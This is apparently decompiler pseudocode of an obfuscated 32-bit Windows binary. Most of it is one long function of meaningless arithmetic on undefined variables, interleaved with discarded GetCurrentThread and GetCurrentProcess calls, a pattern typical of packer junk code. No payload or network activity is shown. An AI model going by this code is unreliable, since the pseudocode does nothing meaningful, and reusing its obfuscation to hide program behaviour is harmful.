// 401D61: variable 'v38' is possibly undefined
// 401D61: variable 'v39' is possibly undefined
// 4022AB: variable 'v24' is possibly undefined
// 40238A: variable 'v47' is possibly undefined
// 40239A: variable 'v26' is possibly undefined
// 4037D1: variable 'v22' is possibly undefined
// 404922: variable 'v57' is possibly undefined
// 404BB8: variable 'v58' is possibly undefined
// 404BD2: variable 'v59' is possibly undefined
// 404BEF: variable 'v60' is possibly undefined
// 401CE9: variable 'v7' is possibly undefined
// 4021C1: variable 'v16' is possibly undefined
// 4021C1: variable 'v15' is possibly undefined
// 402A3E: variable 'v32' is possibly undefined
// 403516: variable 'v21' is possibly undefined
// 4027DB: variable 'v28' is possibly undefined
// 4027DB: variable 'v27' is possibly undefined
// 4027EB: variable 'v30' is possibly undefined
// 4027EB: variable 'v29' is possibly undefined
// 4034FE: variable 'v36' is possibly undefined
// 403B2D: variable 'v49' is possibly undefined
// 4030E9: variable 'v35' is possibly undefined
// 40107A: variable 'v5' is possibly undefined
// 402B1B: variable 'v33' is possibly undefined
// 401D9F: variable 'v10' is possibly undefined
// 401D9F: variable 'v9' is possibly undefined
// 401DFE: variable 'v14' is possibly undefined
// 43A888: using guessed type char byte_43A888;
// 43AC7D: using guessed type int dword_43AC7D;

//----- (00402B35) --------------------------------------------------------
int __fastcall sub_402B35(int a1, int a2)
{
  int v2; // eax
  int v3; // edx
  int v5; // edx
  unsigned int v6; // ecx
  int v7; // edx
  unsigned int v8; // ecx
  int v9; // eax
  __int16 v10; // [esp+40h] [ebp-1E4h]
  unsigned __int16 v11; // [esp+40h] [ebp-1E4h]
  char v12[8]; // [esp+54h] [ebp-1D0h] BYREF
  int v13; // [esp+A4h] [ebp-180h]
  int v14; // [esp+14Ch] [ebp-D8h]
  char v15[36]; // [esp+17Ch] [ebp-A8h] BYREF
  int v16; // [esp+1A4h] [ebp-80h]
  int v17; // [esp+1FCh] [ebp-28h]
  __int16 v18; // [esp+214h] [ebp-10h]

  sub_402D78(0, a2, 24, 31, 0);
  sub_402D78(v6, v5, 64, 25, 0);
  v11 = v18 & v10;
  v2 = sub_40300C((int)v12, 1485190739, 0, (int)v12, 0);
  v17 &= v2;
  v13 -= v16 + __CFADD__(v11, 5066) + v11 + 5066;
  v9 = sub_402D78(v8, v7, 10, 26, 0);
  sub_40300C(v9, v14, (int)v15, (int)v15, 0);
  return sub_402272(v3, v3, 0) | 0x95C;
}
// 404B49: variable 'v6' is possibly undefined
// 404B49: variable 'v5' is possibly undefined
// 404B52: variable 'v10' is possibly undefined
// 404CC0: variable 'v8' is possibly undefined
// 404CC0: variable 'v7' is possibly undefined
// 4040D0: variable 'v3' is possibly undefined

//----- (00402D78) --------------------------------------------------------
int __fastcall sub_402D78(unsigned int a1, int a2, int a3, int a4, int a5)
{
  int v5; // eax
  int result; // eax
  unsigned int v7; // [esp+58h] [ebp-1A0h]
  int v8; // [esp+F8h] [ebp-100h]
  unsigned __int8 v9; // [esp+17Ch] [ebp-7Ch]

  v5 = (v9 ^ 0x256B) - v8;
  if ( (v5 & 0x1684) == 0 )
    goto LABEL_6;
  result = (v5 & 0x23A ^ 0x3C0C) + 8248;
  if ( v7 >= a1 )
  {
    v5 = result & 0x3890 | 0xAE2;
LABEL_6:
    result = v5 | 0x39A6;
  }
  return result;
}
// 404184: variable 'v9' is possibly undefined
// 404193: variable 'v8' is possibly undefined
// 4041B9: variable 'v7' is possibly undefined

//----- (00402F82) --------------------------------------------------------
int __thiscall sub_402F82(void *this, int a2, int a3, int a4)
{
  int v4; // edx
  int v5; // ecx
  int v6; // eax
  unsigned int v7; // edx
  int v8; // ecx
  unsigned int v9; // eax
  bool v10; // cf
  unsigned int v11; // eax
  char v12; // cf
  int v13; // edx
  int v14; // eax
  int v15; // eax
  int v16; // edx
  int v17; // eax
  int v18; // edx
  int v19; // ecx
  int v20; // eax
  int v21; // ecx
  int v22; // edx
  int v23; // ecx
  int v24; // edx
  unsigned int v25; // ecx
  unsigned __int16 v26; // ax
  unsigned int v27; // edx
  unsigned int v28; // ecx
  unsigned int v29; // eax
  int v30; // edx
  int v31; // edx
  int v32; // ecx
  int v33; // edx
  unsigned int v34; // ecx
  int v35; // edx
  int v36; // ecx
  __int16 v37; // ax
  int v38; // edx
  int v39; // eax
  unsigned int v40; // eax
  int v41; // edx
  unsigned int v42; // ecx
  HANDLE v43; // eax
  int v44; // edx
  int v45; // ecx
  unsigned int v46; // ecx
  int v47; // edx
  int v48; // edx
  int v49; // eax
  int v50; // eax
  int v51; // eax
  unsigned int v52; // eax
  unsigned int v53; // eax
  int v54; // eax
  int v55; // eax
  int v56; // edx
  int v57; // ecx
  int v58; // edx
  unsigned int v59; // ecx
  int v60; // edx
  int v61; // ecx
  int v62; // edx
  int v63; // ecx
  __int16 v64; // ax
  int v65; // edx
  unsigned int v66; // ecx
  int v67; // edx
  int v68; // edx
  int v69; // ecx
  __int16 v70; // ax
  int v71; // edx
  __int16 v72; // ax
  int v73; // edx
  int v74; // ecx
  unsigned int v75; // eax
  int v76; // edx
  int v77; // ecx
  unsigned int v78; // edx
  __int16 v79; // cx
  unsigned int v80; // eax
  int v81; // edx
  int v82; // eax
  int v83; // edx
  int v84; // ecx
  int v85; // edx
  int v86; // edx
  int v87; // ecx
  unsigned int v88; // eax
  int v89; // ecx
  int v90; // eax
  int v91; // ecx
  int v92; // ecx
  __int16 v93; // ax
  int v94; // eax
  int v95; // ecx
  int v96; // edx
  unsigned int v97; // ecx
  int v98; // eax
  unsigned int v99; // ecx
  int v100; // eax
  unsigned int v101; // eax
  unsigned int v102; // edx
  int v103; // edx
  int v104; // edx
  int v105; // ecx
  int v106; // eax
  int v107; // edx
  int v108; // ecx
  int v109; // edx
  unsigned int v110; // eax
  int v111; // eax
  int v112; // eax
  bool v113; // cf
  int v114; // eax
  int v115; // edx
  int v116; // edx
  int v117; // ecx
  int v118; // edx
  int v119; // ecx
  int v120; // eax
  int v121; // edx
  unsigned int v122; // ecx
  int v123; // eax
  int v124; // ecx
  int v125; // edx
  int v126; // ecx
  int v127; // edx
  int v128; // ecx
  int v129; // edx
  int v130; // ecx
  __int16 v131; // ax
  unsigned int v132; // eax
  int v133; // ecx
  int v134; // eax
  unsigned int v135; // edx
  unsigned int v136; // ecx
  int v137; // edx
  unsigned int v138; // ecx
  unsigned int v139; // eax
  int v140; // eax
  int v141; // eax
  int v142; // eax
  unsigned int v143; // eax
  BOOL v144; // ett
  int v145; // edx
  int v146; // ecx
  unsigned __int16 v147; // ax
  int v148; // eax
  unsigned int v149; // eax
  int v150; // eax
  int v151; // eax
  int v152; // ecx
  int v153; // edx
  int v154; // edx
  int v155; // ecx
  int v156; // ecx
  unsigned int v157; // eax
  char v158; // cf
  unsigned int v159; // eax
  int v160; // edx
  unsigned int v161; // ecx
  int v162; // eax
  HANDLE v163; // eax
  unsigned int v164; // eax
  int v165; // edx
  int v166; // ecx
  unsigned int v167; // eax
  int v168; // eax
  int v169; // edx
  int v170; // ecx
  int v171; // eax
  int v172; // ecx
  int v173; // edx
  unsigned int v174; // ecx
  int v175; // edx
  int v176; // eax
  int v177; // edx
  int v178; // edx
  int v179; // ecx
  int v181; // edx
  int v182; // eax
  int v183; // eax
  BOOL v184; // ett
  int v185; // eax
  int v186; // edx
  int v187; // eax
  HANDLE v188; // eax
  int v189; // ecx
  int v190; // eax
  int v191; // edx
  int v192; // edx
  int v193; // eax
  int v194; // ecx
  __int16 v195; // ax
  __int16 v196; // ax
  unsigned int v197; // eax
  unsigned __int16 v198; // ax
  int v199; // edx
  unsigned int v200; // ecx
  unsigned int v201; // ecx
  int v202; // ecx
  int v203; // eax
  bool v204; // cf
  int v205; // edx
  int v206; // ecx
  int v207; // edx
  int v208; // edx
  int v209; // ecx
  int v210; // eax
  int v211; // eax
  int v212; // eax
  int v213; // ecx
  int v214; // eax
  unsigned int v215; // eax
  unsigned int v216; // eax
  int v217; // eax
  int v218; // edx
  int v219; // ecx
  unsigned int v220; // edx
  unsigned int v221; // ecx
  int v222; // eax
  int v223; // eax
  int v224; // edx
  int v225; // edx
  int v226; // ecx
  unsigned int v227; // eax
  unsigned int v228; // eax
  HANDLE v229; // [esp-4h] [ebp-210h]
  int v230; // [esp-4h] [ebp-210h]
  int v231; // [esp-4h] [ebp-210h]
  unsigned __int8 v232; // [esp+4h] [ebp-208h]
  int v233; // [esp+Ch] [ebp-200h]
  int v234; // [esp+10h] [ebp-1FCh] BYREF
  int v235; // [esp+14h] [ebp-1F8h]
  __int16 v236; // [esp+18h] [ebp-1F4h] BYREF
  int v237; // [esp+1Ch] [ebp-1F0h]
  int v238; // [esp+28h] [ebp-1E4h]
  int v239; // [esp+30h] [ebp-1DCh] BYREF
  int v240; // [esp+34h] [ebp-1D8h]
  int v241[2]; // [esp+38h] [ebp-1D4h] BYREF
  int v242; // [esp+40h] [ebp-1CCh]
  int v243; // [esp+44h] [ebp-1C8h] BYREF
  int v244; // [esp+48h] [ebp-1C4h]
  int v245; // [esp+4Ch] [ebp-1C0h]
  unsigned int v246; // [esp+50h] [ebp-1BCh] BYREF
  unsigned int v247; // [esp+54h] [ebp-1B8h]
  int v248; // [esp+58h] [ebp-1B4h]
  int v249; // [esp+60h] [ebp-1ACh] BYREF
  int v250; // [esp+64h] [ebp-1A8h]
  int v251; // [esp+68h] [ebp-1A4h]
  int v252; // [esp+6Ch] [ebp-1A0h] BYREF
  int v253; // [esp+70h] [ebp-19Ch]
  int v254; // [esp+7Ch] [ebp-190h]
  int v255; // [esp+88h] [ebp-184h]
  int v256; // [esp+90h] [ebp-17Ch]
  int v257; // [esp+98h] [ebp-174h]
  int v258; // [esp+9Ch] [ebp-170h] BYREF
  int v259; // [esp+A4h] [ebp-168h] BYREF
  int v260; // [esp+A8h] [ebp-164h]
  int v261; // [esp+ACh] [ebp-160h]
  int v262; // [esp+B0h] [ebp-15Ch]
  int v263; // [esp+B4h] [ebp-158h]
  char v264[4]; // [esp+B8h] [ebp-154h] BYREF
  int v265; // [esp+BCh] [ebp-150h]
  unsigned int v266; // [esp+C0h] [ebp-14Ch]
  int v267[3]; // [esp+C4h] [ebp-148h] BYREF
  int v268; // [esp+D0h] [ebp-13Ch] BYREF
  int v269; // [esp+D4h] [ebp-138h]
  int v270; // [esp+D8h] [ebp-134h]
  int v271; // [esp+E0h] [ebp-12Ch]
  int v272; // [esp+E8h] [ebp-124h]
  __int16 v273; // [esp+F0h] [ebp-11Ch] BYREF
  int v274; // [esp+F4h] [ebp-118h]
  int v275; // [esp+FCh] [ebp-110h] BYREF
  int v276; // [esp+100h] [ebp-10Ch]
  int v277; // [esp+104h] [ebp-108h] BYREF
  int v278; // [esp+108h] [ebp-104h]
  int v279; // [esp+118h] [ebp-F4h]
  int v280; // [esp+11Ch] [ebp-F0h]
  unsigned int v281; // [esp+120h] [ebp-ECh]
  char v282[4]; // [esp+128h] [ebp-E4h] BYREF
  int v283; // [esp+12Ch] [ebp-E0h] BYREF
  int v284; // [esp+130h] [ebp-DCh] BYREF
  int v285[2]; // [esp+134h] [ebp-D8h] BYREF
  int v286; // [esp+13Ch] [ebp-D0h]
  int v287; // [esp+140h] [ebp-CCh]
  int v288; // [esp+148h] [ebp-C4h]
  int v289; // [esp+154h] [ebp-B8h]
  int v290; // [esp+15Ch] [ebp-B0h]
  int v291; // [esp+164h] [ebp-A8h]
  int v292[2]; // [esp+168h] [ebp-A4h] BYREF
  int v293; // [esp+170h] [ebp-9Ch]
  int v294; // [esp+17Ch] [ebp-90h]
  unsigned int v295; // [esp+18Ch] [ebp-80h] BYREF
  int v296; // [esp+194h] [ebp-78h]
  int v297; // [esp+198h] [ebp-74h]
  unsigned __int8 v298; // [esp+19Ch] [ebp-70h]
  unsigned int v299; // [esp+1A0h] [ebp-6Ch]
  unsigned int v300; // [esp+1A4h] [ebp-68h]
  int v301; // [esp+1A8h] [ebp-64h]
  int v302; // [esp+1ACh] [ebp-60h]
  int v303; // [esp+1B0h] [ebp-5Ch]
  int v304; // [esp+1B4h] [ebp-58h] BYREF
  int v305[2]; // [esp+1B8h] [ebp-54h] BYREF
  int v306; // [esp+1C0h] [ebp-4Ch]
  __int16 v307; // [esp+1CCh] [ebp-40h] BYREF
  int v308; // [esp+1D8h] [ebp-34h]
  unsigned __int8 v309; // [esp+1E0h] [ebp-2Ch]
  int v310; // [esp+1F0h] [ebp-1Ch]
  int v311; // [esp+200h] [ebp-Ch]
  int v312; // [esp+204h] [ebp-8h]
  int v313; // [esp+208h] [ebp-4h]

  sub_402272((int)this, v254, 0);
  sub_402B35(v126, v125);
  sub_402B35(v128, v127);
  sub_401779(-736461116, -2120570657);
  v272 ^= sub_402B35(v130, v129);
  sub_401BE4(0, 0, v233);
  GetCurrentThread();
  sub_402D78(v66, v65, 59, 16, 0);
  v190 = sub_402272(v189, 677069385, 0);
  sub_40300C(v190, 359334864, (int)&v284, (int)&v284, 0);
  v139 = sub_402D78(v138, v137, 53, 30, 0);
  v257 -= (unsigned __int8)v308
        - ((__CFADD__(v139 < (unsigned int)v10 + 6737, v139 - (v10 + 6737)) | __CFADD__(
                                                                                (v139 < (unsigned int)v10 + 6737)
                                                                              + v139
                                                                              - (v10
                                                                               + 6737),
                                                                                13389))
         + v263);
  v140 = sub_402272(1396097877, v281, 0);
  v300 += v140;
  v147 = (unsigned __int16)GetCurrentProcess();
  v148 = (v147 - (v10 + 5759)) & 0x32AF;
  v253 -= v148;
  v149 = ((unsigned __int16)v148 ^ 0x1CE7) & 0x3FDB;
  v10 = v246 < v149;
  v246 -= v149;
  v150 = v10 + v149 + 453;
  v294 -= v150;
  v151 = v150 - 16127;
  if ( (v151 & 0x3F58) == 0 )
    v151 += 6466;
  sub_40300C(v151, v242, (int)v264, (int)v264, 0);
  sub_402272(-479920752, 972862199, 0);
  sub_401BE4(0, 0, v16);
  GetCurrentThread();
  v17 = sub_402272(v234, v303, 0);
  v20 = (__PAIR64__(((v17 - (v10 + 15806)) | 0x1659u) - 3040, (v17 - (v10 + 15806)) | 0x1659u) - 0x2F8400000BE0i64) >> 32;
  if ( (v19 & 0x3AF2) != 0 )
    v313 &= v20;
  sub_402B35(v19, v18);
  sub_402D78(0, v225, 50, 24, 0);
  sub_402B35(v23, v22);
  sub_402D78(v201, 0, 6, 9, 0);
  sub_401779(v202, v290);
  GetCurrentProcessId();
  v157 = sub_401BE4(v156, 0, 1710208240);
  v159 = sub_401BE4(v157 | 0x1C93, 0, 815479548);
  v162 = v286 & (v159 - (v158 + 5846));
  v259 += v162;
  if ( !v160 )
    goto LABEL_73;
  v212 = (v162 - 3581) ^ 0x22D8;
  v40 = v212 - 8353;
  if ( v161 >= v40 )
  {
    v227 = v40 + 13727;
    v228 = v227 + 2982;
    if ( v228 >= v299 )
    {
      v291 &= v228;
      v249 &= (14333 - v276) ^ 0x38CD;
LABEL_73:
      v290 -= 7045;
      goto LABEL_80;
    }
  }
LABEL_80:
  sub_40300C((int)&v252, v161, v305[0], (int)&v252, 0);
  sub_402D78(0, v85, 35, 35, 0);
  GetCurrentProcess();
  sub_402B35(v87, v86);
  sub_401A03(40);
  GetCurrentThread();
  v269 |= sub_401A03(57);
  sub_402D78(v34, v33, 12, 53, 0);
  sub_402B35(v36, v35);
  sub_402D78(0, v186, 1, 10, 0);
  v187 = sub_401779(v263, -1758758438) - 1632;
  sub_40300C(v187, (int)v305, 1590933670, (int)v305, 0);
  sub_402B35(v166, v165);
  GetCurrentThread();
  GetCurrentProcess();
  if ( v220 >= v281 )
  {
    v222 = -(v247 < 0x324B);
    if ( (v221 & v222) == 0 )
    {
      v50 = v222 & 0x2266;
      if ( v220 <= v221 )
        v239 += v50 | 0x1196;
    }
  }
  GetCurrentProcess();
  GetCurrentThread();
  sub_401BE4(0, 0, v13);
  v231 = GetCurrentProcessId();
  sub_401BE4(0, 0, v231);
  v93 = sub_402272(v92, v275, 0);
  v94 = sub_40300C(v93 & 0x390D, v93 & 0x390D, v255, (int)v285, 0);
  sub_401779(v275 & (2 * v94), v95);
  if ( (unsigned __int16)v291 <= v97 )
    v295 = (__PAIR64__(v295, (unsigned __int16)v291) - __PAIR64__((unsigned __int16)v291, v97)) >> 32;
  v141 = (((unsigned __int16)sub_40300C((int)v241, v96, v310, (int)v241, 0) - 8059) & 0x79A) + 4470;
  sub_40300C(v141, v21, -1797753565, (int)&v268, 0);
  GetCurrentProcessId();
  sub_402D78(v42, v41, 15, 27, 0);
  v43 = GetCurrentThread();
  sub_401779((int)v43, v274);
  sub_402B35(v45, v44);
  v197 = sub_401BE4(0, 0, v242) + 12769;
  v277 += v197;
  sub_40300C(v197 | 0x3F82, v247, -1826013409, (int)&v239, 0);
  v198 = (unsigned __int16)GetCurrentThread();
  v291 |= ((v10 + v198 + 79) & 0x3EA0) - 6451;
  GetCurrentProcess();
  v55 = sub_401779(783197981, v252);
  v302 &= v55;
  sub_402B35(v57, v56);
  sub_402D78(v59, v58, 23, 16, 0);
  GetCurrentProcess();
  sub_40300C((int)&v243, 1204985327, v274, (int)&v243, 0);
  sub_401A03(57);
  sub_402B35(v209, v208);
  v223 = sub_402272(v302, -1781233359, 0);
  v270 += (v10 + v223 + 478 - ((__CFADD__(v10, v223) | __CFADD__(v10 + v223, 478)) + 12741)) ^ 0x34FE;
  sub_401A03(2);
  v203 = sub_401A03(2);
  v245 -= (v203 - (v10 + 11067)) | 0xC87;
  GetCurrentProcess();
  v301 &= sub_401A03(47);
  sub_401BE4(v207, 0, -1035608558);
  sub_401779(v84, v83);
  sub_401A03(46);
  sub_402D78(0, v81, 50, 41, 0);
  sub_401A03(18);
  v82 = sub_401A03(48);
  v290 -= v10 + v82 + 12915;
  v216 = sub_401BE4(0, 0, 970731630);
  v217 = v216 - (v10 + v278) + 3983 - ((((v216 - (v10 + v278)) | 0x1B4A00000000ui64) + 3983) >> 32);
  sub_40300C(v217, v271, -286873709, (int)v241, 0);
  GetCurrentThread();
  sub_40300C(0, 1348972122, -1051424044, (int)&v258, 0);
  v100 = __CFADD__(v234 & 0x87, 12399) + (v234 & 0x87) + 12399 + 15072;
  v279 ^= v100;
  v101 = (__PAIR64__(v100 + 10790 - ((((unsigned int)v100 | 0x192E00000000ui64) + 10790) >> 32), v100 + 10790)
        - (((unsigned int)__CFADD__(v100, 10790) + 6446) | 0x226E00000000i64)) >> 32;
  if ( v101 <= v102 )
    v101 ^= 0x18D0u;
  sub_401BE4(v101, 0, 1810968074);
  GetCurrentThread();
  sub_40300C((int)&v259, v71, 0, (int)&v259, 0);
  v72 = sub_401A03(54);
  v75 = ((v10 + v72 + 13040) & 0x435) - 12222;
  if ( v74 == v73 )
    v75 = (v75 < 0x3901) + v75 - 14593 + 4167;
  sub_40300C(v75, 230180753, 415307653, (int)&v246, 0);
  sub_402D78(0, v191, 60, 44, 0);
  GetCurrentProcessId();
  v26 = sub_402D78(v25, v24, 29, 40, 0);
  v29 = (((unsigned __int16)v258 | v26) + 5341) & 0x131B;
  if ( v27 > v29 )
    goto LABEL_85;
  v204 = 0;
  if ( v28 )
  {
LABEL_82:
    v168 = v29 - (v204 + 7419);
    goto LABEL_64;
  }
  v168 = (unsigned __int8)v260 - 464;
  if ( !v27 )
  {
    v238 ^= (unsigned __int16)v250;
    v29 = ((unsigned __int16)v250 + 3914) ^ 0x60F;
LABEL_85:
    v215 = v29 | 0xA08;
    v268 -= v215;
    v215 -= 11649;
    v204 = v215 < 0x29D9;
    v29 = v215 - 10713;
    goto LABEL_82;
  }
LABEL_64:
  v270 -= v168 - 15864 - v267[2];
  v51 = sub_402D78(v28, v27, 52, 10, 0);
  v53 = v265 | v51;
  v244 &= v53;
  v54 = (v53 < 0x4C9) + v53 - 1225 + 2679;
  v308 ^= (__CFADD__(v237, v54) + v237 + v54 + 12655) ^ 0x3C6;
  sub_402272(-1409594837, v292[1], 0);
  v123 = sub_401A03(34) + 6789;
  v112 = v123 - 2032;
  v113 = 0;
  if ( (v124 & 0x3C8F) == 0 )
  {
    v312 += (unsigned __int16)v278 + 8371;
    v88 = v287 & v235 & 0xC2 ^ 0xBE2;
    v113 = v88 < 0x1789;
    v112 = v88 - 6025;
  }
  v252 += v112 + v113;
  sub_402272(0, v124, 0);
  GetCurrentProcess();
  v230 = sub_401BE4(v224, 0, v304);
  sub_401BE4(0, 0, v230);
  sub_401779(1742465408, v103);
  sub_402272(v104, v105, 0);
  GetCurrentProcessId();
  v106 = sub_40300C((int)&v234, 492421074, 1821752100, (int)&v234, 0);
  v304 &= v106;
  v49 = ((_WORD)v106 + 6385) & 0x400;
  v292[0] -= v49;
  if ( !v108 )
    LOWORD(v49) = v49 - 16363;
  v70 = v49 | 0x31C6;
  v37 = v70 - 2260 + 14063;
  if ( v304 != v108 )
    goto LABEL_71;
  v64 = v37 - v283 + 4034;
  if ( v107 >= (v286 ^ v64 & 0x240A) )
  {
    v289 &= ((unsigned __int8)v310 ^ 0x3301) - 9970;
    v37 = (unsigned __int8)v306;
LABEL_71:
    v292[0] |= (v37 & 0x1D4) + 10458 - (((v37 & 0x1D4 | 0x35AC00000000ui64) + 10458) >> 32);
  }
  GetCurrentProcessId();
  sub_401779(v153, v280);
  v110 = sub_401BE4(0, 0, v109);
  v295 += v110 + v10;
  v293 -= (int)GetCurrentProcess();
  sub_401A03(52);
  sub_402D78(v200, v199, 50, 25, 0);
  GetCurrentThread();
  sub_401BE4(0, 0, 792637634);
  sub_40300C((int)&v277, v48, (int)&v277, (int)&v277, 0);
  v229 = GetCurrentThread();
  sub_401BE4(0, 0, (int)v229);
  sub_40300C((unsigned __int8)v288, v311, (unsigned __int8)v288, (int)&v249, 0);
  sub_402B35(v206, v205);
  sub_402B35(v219, v218);
  GetCurrentProcess();
  sub_401A03(13);
  v52 = sub_401BE4(0, 0, v260);
  v256 |= v52;
  sub_401779((v52 | 0x8A3) - 7394, v60);
  GetCurrentThread();
  sub_401BE4(v61, 0, -98029533);
  v114 = sub_402B35(v63, v62) & 0x1424;
  v10 = __CFADD__(v114, v277);
  v277 += v114;
  v276 += v114 + v10;
  sub_40300C(v232, v115, v115, (int)&v283, 0);
  sub_402B35(v117, v116);
  v120 = sub_402B35(v119, v118);
  v312 -= v10 + v120;
  sub_402D78(v122, v121, 1, 57, 0);
  v39 = sub_40300C((int)&v304, v38, v38, (int)&v304, 0);
  v262 -= v39;
  GetCurrentThread();
  sub_402272(v30, -1532404236, 0);
  sub_402B35(v32, v31);
  v251 ^= v276 | ((unsigned __int8)v301 - 2484);
  v302 -= (unsigned int)GetCurrentThread() ^ 0x16FB;
  sub_401BE4(v226, 0, v226);
  sub_40300C(0, 0, v286, (int)&v236, 0);
  GetCurrentThread();
  sub_401779(v258, -281429309);
  sub_402B35(v146, v145);
  sub_401A03(38);
  v195 = sub_402272(-1208544166, v194, 0);
  v111 = sub_40300C((v195 - (v10 + 173)) & 0x3E12, v285[1], (int)v282, (int)v282, 0);
  v265 += v111 + v10;
  sub_401779(167704752, v91);
  sub_402D78(v46, 0, 60, 43, 0);
  sub_402272(v47, v260, 0);
  sub_401A03(8);
  v188 = GetCurrentThread();
  sub_40300C((int)v188, (int)v188, v169, (int)&v295, 0);
  sub_401A03(57);
  v171 = sub_401779(2029513551, v170);
  v249 -= v10 + v171;
  sub_401BE4(0, 0, 804539672);
  sub_401BE4(0, 0, v67);
  GetCurrentProcess();
  sub_401A03(30);
  v131 = LOBYTE(v292[0]);
  if ( LOBYTE(v292[0]) != v68 )
  {
LABEL_70:
    v132 = ((unsigned __int16)(((v246 + ((v131 + 6586) | 0x2A83)) & 0x3814) + 12223) | 0x522) & 0x1C67;
    goto LABEL_72;
  }
  v132 = (unsigned __int8)v265 - 4250;
  if ( (v68 & v256) == 0 )
  {
    v10 = __CFADD__(v132, v272);
    v272 += v132;
    v196 = ((_BYTE)v265 + 102 - (v10 + 126)) & 0x50;
    if ( (((_BYTE)v265 + 102 - (v10 + 126)) & 0x10) != 0 )
      goto LABEL_44;
    v131 = v196 - 11019 + 10319;
    goto LABEL_70;
  }
LABEL_72:
  v10 = v300 < v132;
  v300 -= v132;
  v196 = ((v240 + v10 + (_WORD)v132 - ((__CFADD__(v10, v132) | __CFADD__(v240, v10 + v132)) + 2578)) & 0x286D) + 2933;
LABEL_44:
  v250 ^= v196 & 0x2C40;
  v98 = sub_401779(v68, v69);
  v248 ^= v98;
  v269 &= (v98 ^ 0x5A2) - 1650;
  v6 = sub_402D78(v99, 0, 21, 49, 0);
  v9 = v6 - (v10 + 7339);
  v10 = v9 < v7;
  if ( v9 < v7 )
    goto LABEL_55;
  v9 = ((((v9 + 1487) | 0x174) + 0x1FFF) | 0x3D73) + 14523;
  v10 = v7 < v9;
  if ( v7 < v9 )
    goto LABEL_55;
  v11 = (unsigned __int16)v289;
  v12 = 0;
  if ( !v8 )
  {
    v10 = __CFADD__((unsigned __int16)v289, 7278);
    v9 = (unsigned __int16)v289 + 7278;
LABEL_55:
    v144 = v10;
    v10 = __CFADD__(v10, v9);
    v143 = v144 + v9;
    v12 = v10 | __CFADD__(v143, 4719);
    v11 = v143 + 4719;
  }
  v210 = v11 - (v12 + 7025) - v270;
  if ( (v210 & v8) >= 0 )
  {
    v211 = v254 ^ v210;
    v185 = v211 - 8685;
    if ( v8 == v185 )
      v297 |= 2 * (v185 - 11294);
  }
  sub_40300C(0, -415313988, v256, (int)&v275, 0);
  sub_401779(v152, -1609489861);
  sub_402B35(v155, v154);
  v167 = ((unsigned int)GetCurrentThread() + 15635) ^ 0xF27;
  if ( (v167 & 0x695) == 0 )
    v250 &= v167;
  sub_401A03(38);
  GetCurrentThread();
  v193 = sub_402D78(0, v192, 1, 57, 0);
  sub_401779(v10 + v193 + 12660, v239);
  sub_401779(v77, v76);
  v80 = (__CFADD__(__CFADD__(LOBYTE(v292[0]), 2098), LOBYTE(v292[0]) + 2098) | __CFADD__(
                                                                                 v306,
                                                                                 __CFADD__(LOBYTE(v292[0]), 2098)
                                                                               + LOBYTE(v292[0])
                                                                               + 2098))
      + v306
      + __CFADD__(LOBYTE(v292[0]), 2098)
      + LOBYTE(v292[0])
      + 2098
      + 3175;
  if ( v234 == v80 && (v79 & 0x2803) == 0 && v80 >= v78 && (v78 & 0xD50) == 0 )
    v296 += (__CFADD__(__CFADD__(LOBYTE(v292[0]), 2098), LOBYTE(v292[0]) + 2098) | __CFADD__(
                                                                                     v306,
                                                                                     __CFADD__(LOBYTE(v292[0]), 2098)
                                                                                   + LOBYTE(v292[0])
                                                                                   + 2098))
          + v306
          + __CFADD__(LOBYTE(v292[0]), 2098)
          + LOBYTE(v292[0])
          + 2098
          + 10161;
  GetCurrentProcess();
  sub_40300C((int)&v273, 0, v267[0], (int)&v273, 0);
  sub_401779(v237, 114795968);
  sub_402272(v172, v172, 0);
  GetCurrentThread();
  sub_40300C((int)v267, (int)v267, (int)v267, (int)v267, 0);
  sub_402272(-1480681907, v258, 0);
  sub_401BE4(v89, 0, v89);
  v90 = sub_402272(1156498895, v284, 0);
  v297 &= v90;
  v134 = sub_40300C((int)&v307, (int)&v307, v133, (int)&v307, 0);
  v142 = (__PAIR64__((v134 | 0xCBBu) - 14896, v134 | 0xCBBu) - 0x36FC00003A30i64) >> 32;
  if ( v135 > v136 || (v142 += 14109, v253 &= v142, v136) )
  {
    v246 |= v142;
    v240 += v309;
  }
  sub_401A03(19);
  v163 = GetCurrentThread();
  v164 = sub_401BE4(0, 0, (int)v163);
  v266 = (__PAIR64__(v266, v164) - __PAIR64__(v164 - (v10 + v245), (unsigned int)v10 + v245)) >> 32;
  sub_402D78(v174, v173, 32, 30, 0);
  GetCurrentThread();
  v176 = sub_402272(-1760936362, v175, 0) ^ 0x409;
  v261 ^= v176;
  v242 += v176;
  v14 = __CFADD__(v176 | 0x31A6, 3891) + (v176 | 0x31A6) + 3891 + 14127;
  if ( (v177 & v287) == 0 )
    v14 = v298;
  sub_40300C(v14, 642143828, (int)v292, (int)v292, 0);
  sub_402272(v5, v4, 0);
  v182 = sub_401779(v181, v181);
  v184 = v10;
  v10 = __CFADD__(v10, v182);
  v183 = v184 + v182;
  v10 |= __CFADD__(v183, 7025);
  v183 += 7025;
  v268 += v183 + v10;
  v15 = (sub_402272(v183, 0, 0) ^ 0x1A9F) + 12956;
  v288 -= (v15 + 3911) | 0x2949;
  v214 = (((unsigned __int16)sub_401779(v213, -1456368036) + 12998) & 0x3654) + 14443;
  v291 &= v214;
  return ((unsigned __int16)sub_402B35(v179, v178) - 5758) & 0xCDE;
}
// 402FA1: variable 'v126' is possibly undefined
// 402FA1: variable 'v125' is possibly undefined
// 402FA9: variable 'v128' is possibly undefined
// 402FA9: variable 'v127' is possibly undefined
// 402FD3: variable 'v130' is possibly undefined
// 402FD3: variable 'v129' is possibly undefined
// 404E7D: variable 'v233' is possibly undefined
// 40228C: variable 'v66' is possibly undefined
// 40228C: variable 'v65' is possibly undefined
// 403DF1: variable 'v189' is possibly undefined
// 4031D1: variable 'v138' is possibly undefined
// 4031D1: variable 'v137' is possibly undefined
// 4031D6: variable 'v10' is possibly undefined
// 4010B3: variable 'v99' is possibly undefined
// 4010BD: variable 'v7' is possibly undefined
// 4010F9: variable 'v8' is possibly undefined
// 4011D2: variable 'v13' is possibly undefined
// 4029B7: variable 'v92' is possibly undefined
// 4029E2: variable 'v95' is possibly undefined
// 401228: variable 'v177' is possibly undefined
// 4012C7: variable 'v16' is possibly undefined
// 40130A: variable 'v19' is possibly undefined
// 401513: variable 'v79' is possibly undefined
// 401521: variable 'v78' is possibly undefined
// 403491: variable 'v153' is possibly undefined
// 402BAC: variable 'v109' is possibly undefined
// 4040F0: variable 'v200' is possibly undefined
// 4040F0: variable 'v199' is possibly undefined
// 401B96: variable 'v48' is possibly undefined
